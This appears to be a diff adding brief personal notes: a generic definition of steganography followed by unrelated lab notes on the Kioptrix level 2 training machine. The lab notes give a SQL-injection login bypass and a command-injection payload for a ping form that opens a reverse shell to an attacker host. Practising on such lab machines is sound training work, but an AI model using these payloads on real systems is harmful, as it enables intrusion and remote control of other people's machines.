@@ -1,0 +1,10 @@
+Steganography is the practice of concealing information within another message or physical object to avoid detection. Steganography can be used to hide virtually any type of digital content, including text, image, video, or audio content. That hidden data is then extracted at its destination
+
+kioptrix lvl 2
+----------------
+
+login : ' or 1=1 --
+pass : ' or 1=1 --
+
+using this code in (ping a machine) i can get a shell 
+0.1; bash -i >& /dev/tcp/my.ip/1337 0>&1
